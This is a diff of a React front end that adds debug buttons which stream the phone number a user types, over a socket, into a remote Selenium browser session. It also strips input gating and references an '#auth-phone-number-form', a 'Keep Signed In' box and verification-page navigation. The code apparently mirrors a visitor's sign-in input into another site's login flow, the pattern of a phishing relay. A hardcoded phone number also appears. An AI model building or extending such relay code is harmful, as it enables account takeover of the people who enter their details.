@@ -2128,16 +2128,17 @@ Status: ${seleniumStatus}`);
                   marginLeft: '8px',
                   padding: '4px 12px',
                   fontSize: '11px',
-                  backgroundColor: '#6f42c1',
+                  backgroundColor: '#6c757d',
                   color: 'white',
                   border: 'none',
                   borderRadius: '4px',
                   cursor: 'pointer'
                 }}
               >
-                Test Clear
+                🔍 Debug State
               </button>
             )}
+
             {isInputsReady && (
               <button
                 onClick={syncFullPhoneNumberToSelenium}
@@ -2172,6 +2173,55 @@ Status: ${seleniumStatus}`);
                 }}
               >
                 Check Sync
+              </button>
+            )}
+            {isInputsReady && (
+              <button
+                onClick={fixCountryAndPhoneSync}
+                style={{
+                  marginTop: '8px',
+                  marginLeft: '8px',
+                  padding: '4px 12px',
+                  fontSize: '11px',
+                  backgroundColor: '#17a2b8',
+                  color: 'white',
+                  border: 'none',
+                  borderRadius: '4px',
+                  cursor: 'pointer'
+                }}
+              >
+                🔧 Fix Phone Sync
+              </button>
+            )}
+            {isInputsReady && (
+              <button
+                onClick={() => {
+                  console.log('🚨 EMERGENCY SYNC: Force syncing phone number immediately...');
+                  if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
+                    // Only sync phone number - NO COUNTRY SYNC
+                    console.log('📱 Emergency phone sync with country code:', phoneNumber);
+                    socketRef.current.emit('syncInputToSelenium', {
+                      sessionId: sessionIdRef.current,
+                      inputType: 'phoneNumber',
+                      value: phoneNumber, // Send FULL value with country code
+                      timestamp: new Date().toISOString()
+                    });
+                    setSeleniumStatus('Emergency phone sync completed (no country sync)');
+                  }
+                }}
+                style={{
+                  marginTop: '8px',
+                  marginLeft: '8px',
+                  padding: '4px 12px',
+                  fontSize: '11px',
+                  backgroundColor: '#dc3545',
+                  color: 'white',
+                  border: 'none',
+                  borderRadius: '4px',
+                  cursor: 'pointer'
+                }}
+              >
+                🚨 Emergency Sync
               </button>
             )}
             {isInputsReady && (
@@ -2214,8 +2264,20 @@ Status: ${seleniumStatus}`);
               <button
                 onClick={() => {
                   console.log('🔄 Manual sync using clear-and-retype approach...');
-                  syncCompletePhoneNumber(phoneNumber);
-                  setSeleniumStatus('Manual sync completed');
+                  
+                  if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
+                    console.log('🔄 Manual sync: Sending full phone number with country code to Selenium:', phoneNumber);
+                    socketRef.current.emit('syncInputToSelenium', {
+                      sessionId: sessionIdRef.current,
+                      inputType: 'phoneNumber',
+                      value: phoneNumber, // Send FULL value with country code
+                      timestamp: new Date().toISOString()
+                    });
+                    setSeleniumStatus('Manual sync completed');
+                  } else {
+                    console.log('❌ Cannot manual sync - socket not connected or no session');
+                    setSeleniumStatus('Manual sync failed - no connection');
+                  }
                 }}
                 style={{
                   marginTop: '8px',
@@ -2229,7 +2291,7 @@ Status: ${seleniumStatus}`);
                   cursor: 'pointer'
                 }}
               >
-                Clear & Retype
+                Manual Sync
               </button>
             )}
             {isInputsReady && (
@@ -2416,12 +2478,14 @@ Starts with country code: ${phoneNumber.startsWith(selectedCountry.dialCode) ? '
                         timestamp: new Date().toISOString()
                       });
                       
-                      // Also sync the phone number
+                      // Also sync the phone number (without country code)
                       setTimeout(() => {
+                        const phoneNumberWithoutCountryCode = '403624026';
+                        console.log('🔄 Syncing phone number to Selenium (without country code):', phoneNumberWithoutCountryCode);
                         socketRef.current?.emit('syncInputToSelenium', {
                           sessionId: sessionIdRef.current,
                           inputType: 'phoneNumber',
-                          value: finland.dialCode + ' 403624026',
+                          value: phoneNumberWithoutCountryCode,
                           timestamp: new Date().toISOString()
                         });
                       }, 500);
@@ -2448,8 +2512,8 @@ Starts with country code: ${phoneNumber.startsWith(selectedCountry.dialCode) ? '
             {isInputsReady && (
               <button
                 onClick={() => {
-                  console.log('🧪 Manual test: Starting verification page monitoring...');
-                  startVerificationPageMonitoring();
+                  console.log('🧪 Manual test: This function is no longer needed');
+                  alert('Verification page monitoring is no longer used - navigation happens immediately after NEXT button click');
                 }}
                 style={{
                   marginTop: '8px',
@@ -2697,35 +2761,7 @@ Status: ${seleniumStatus}`);
                 🔍 State Debug
               </button>
             )}
-            {isInputsReady && (
-              <button
-                onClick={() => {
-                  console.log('🔍 Manual URL Check: Checking current page in Selenium...');
-                  if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
-                    socketRef.current.emit('checkPageUrl', {
-                      sessionId: sessionIdRef.current,
-                      timestamp: new Date().toISOString()
-                    });
-                    setSeleniumStatus('🔍 Checking current page URL in Selenium...');
-                  } else {
-                    setSeleniumStatus('🔍 Socket not ready for URL check');
-                  }
-                }}
-                style={{
-                  marginTop: '8px',
-                  marginLeft: '8px',
-                  padding: '4px 12px',
-                  fontSize: '11px',
-                  backgroundColor: '#ffc107',
-                  color: 'black',
-                  border: 'none',
-                  borderRadius: '4px',
-                  cursor: 'pointer'
-                }}
-              >
-                🔍 Check Page URL
-              </button>
-            )}
+
             {isInputsReady && (
               <button
                 onClick={() => {
@@ -2734,7 +2770,6 @@ Status: ${seleniumStatus}`);
                     // Test the exact selector that works in the console
                     socketRef.current.emit('checkElementInSelenium', {
                       sessionId: sessionIdRef.current,
-                      selector: '#auth-phone-number-form button[type="submit"]',
                       timestamp: new Date().toISOString(),
                       elementType: 'testSubmitButton'
                     });
@@ -3053,9 +3088,8 @@ Status: ${seleniumStatus}`);
                   type="tel"
                   value={phoneNumber}
                   onChange={handlePhoneNumberChange}
-                  onKeyDown={handlePhoneNumberKeyDown}
+                  // onKeyDown={handlePhoneNumberKeyDown}
                   placeholder={`${selectedCountry.dialCode} Enter your phone number`}
-                  disabled={!isInputsReady}
                   style={{
                     width: '100%',
                     height: '48px',
@@ -3063,24 +3097,15 @@ Status: ${seleniumStatus}`);
                     border: 'none',
                     outline: 'none',
                     fontSize: '16px',
-                    color: isInputsReady ? '#333' : '#999',
+                    color: '#333',
                     boxSizing: 'border-box',
                     borderRadius: '8px',
-                    backgroundColor: isInputsReady ? 'transparent' : '#f5f5f5',
-                    cursor: isInputsReady ? 'text' : 'not-allowed'
+                    backgroundColor: 'transparent',
+                    cursor: 'text'
                   }}
                 />
               </div>
-              {!isInputsReady && (
-                <div style={{
-                  fontSize: '12px',
-                  color: '#ffc107',
-                  marginTop: '4px',
-                  textAlign: 'center'
-                }}>
-                  Waiting for input field to be ready...
-                </div>
-              )}
+
             </div>
 
             {/* Keep Signed In Checkbox */}
